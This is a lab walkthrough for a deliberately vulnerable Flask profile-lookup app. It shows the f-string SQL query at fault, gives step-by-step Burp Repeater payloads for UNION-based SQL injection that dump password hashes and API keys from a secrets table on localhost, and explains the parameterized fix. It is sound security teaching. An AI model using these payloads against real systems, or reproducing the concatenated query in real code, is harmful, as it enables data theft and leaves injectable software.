# Walkthrough — sqli-union-basic

## 1. Context

The app exposes a "user profile lookup" page. You type a username on `/`, the form submits a `GET /profile?username=<name>` request, and the server queries a `users` table in SQLite and renders the matching row as a small HTML table. Three test users are seeded: `alice`, `bob`, `carol`.

Alongside `users`, the same database file holds a `secrets` table with password hashes and API keys. The feature never reads from it — but the database connection has access to both.

## 2. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). The `/profile` view builds its SQL like this:

```python
username = request.args.get("username", "")
# VULNERABLE: user input concatenated into SQL string
query = f"SELECT username, bio, joined_at FROM users WHERE username = '{username}'"
rows = conn.execute(query).fetchall()
```

The `username` value comes straight from the query string and is pasted into the SQL text with an f-string. No escaping, no parameter binding. Whatever the client sends after `WHERE username = '` becomes part of the SQL that hits SQLite. The vulnerable `profile.html` template also renders the executed query back to the page in a debug block, which makes this lab easier to follow — in a real app, you'd infer the same behavior from error messages, timing, or blind inference.

## 3. Exploitation via Burp Suite (primary track)

Configure Burp Proxy and point your browser at it. Visit <http://127.0.0.1:8001/>, submit `alice` through the form once to capture the traffic, then right-click the `GET /profile?username=alice` request in **Proxy → HTTP history** and choose **Send to Repeater**.

### A note on URL encoding

One gotcha that bites everyone once: **HTTP request lines can't have literal spaces.**

The request line format is `METHOD SP URI SP VERSION` — single spaces delimit the three parts. If you put a literal space inside the URI, the server sees four tokens instead of three and rejects the request with **400 Bad Request** before your SQL ever runs:

```
GET /profile?username=alice' -- HTTP/1.1
 ^                          ^   ^
 |                          |   └─ what the server thinks is the HTTP version
 |                          └───── what the server thinks is the URI (truncated at the first space)
 └──────────────────────────────── method
```

So every space inside the URI must be URL-encoded as `%20`. That's the only character the HTTP parser *forces* you to encode. Other characters in your payload — `'`, `,`, `=`, `--` — are perfectly legal inside a query string per RFC 3986 and travel fine as-is.

**Two ways to do it in Burp Repeater:**

1. **Minimum encoding (what the steps below use).** Type the payload with `%20` wherever you have a space, everything else literal. Readable and valid.
2. **Ctrl+U over the selection.** Paste the payload decoded, select it, press **Ctrl+U**. Burp encodes every unsafe character aggressively — spaces become `%20`, quotes become `%27`, commas become `%2C`, and so on. Works too, just harder to read.

Both forms send the same bytes down the wire to the server after Burp finishes encoding, and the server URL-decodes everything before your Flask app sees it — so `alice'%20--` and `alice%27%20--` both arrive at the app as the string `alice' --`. Pick whichever is easier to edit.

Each step below shows two blocks: a **Payload** (fully decoded, for reading) and a **Request line** (with spaces as `%20`, ready to paste straight into Repeater).

### Step 1 — Confirm the injection point

Payload:

```
alice' --
```

Request line in Repeater:

```
GET /profile?username=alice'%20-- HTTP/1.1
Host: 127.0.0.1:8001
```

Response: the table still shows Alice's row. The "Executed query" debug block confirms the injection:

```
SELECT username, bio, joined_at FROM users WHERE username = 'alice' --'
```

Your `'` closed the string literal, then `--` commented out the trailing `'` that the app tried to append. The statement parsed cleanly and returned Alice. This is the proof that your input became SQL code — not just data.

### Step 2 — Determine column count and displayed columns

Payload:

```
x' UNION SELECT '1','2','3' --
```

Request line in Repeater:

```
GET /profile?username=x'%20UNION%20SELECT%20'1','2','3'%20-- HTTP/1.1
Host: 127.0.0.1:8001
```

Response: the table now shows one row with `1 | 2 | 3`. The first SELECT returned zero rows (no user named `x`); the UNION appended the three literals. You now know the result set has **three columns** and all three are rendered.

Negative probe (optional): change the UNION to two columns (`UNION SELECT '1','2'`). SQLite will reject the statement because UNION requires matching column counts — confirming that your injection is actually reaching the engine and not being stripped somewhere else.

### Step 3 — Exfiltrate data from another table

Payload:

```
x' UNION SELECT users.username, secrets.password_hash, secrets.api_key FROM users JOIN secrets ON users.id = secrets.user_id --
```

Request line in Repeater:

```
GET /profile?username=x'%20UNION%20SELECT%20users.username,%20secrets.password_hash,%20secrets.api_key%20FROM%20users%20JOIN%20secrets%20ON%20users.id%20=%20secrets.user_id%20-- HTTP/1.1
Host: 127.0.0.1:8001
```

Response: three rows, one per user, each leaking the username, bcrypt-style hash, and API key. That's the whole point of this bug — the feature was scoped to a single user's three public fields, but the database connection is not. Any table reachable from this connection is now readable through the `/profile` endpoint.

## 4. Why the fix works

See [`DIFF.md`](./DIFF.md) for the change. In short: the fixed version calls `conn.execute("... WHERE username = ?", (username,))`. The SQLite driver parses the SQL statement first, *without* the parameter value, and only then binds `username` as a literal data value. No character in the input — `'`, `--`, `UNION`, `;`, newline — can escape the string-literal slot to become SQL syntax. Run any payload from section 3 against <http://127.0.0.1:8101/profile> to confirm: the table comes back empty (no user literally named `x' UNION SELECT ...` exists), no secrets leak.
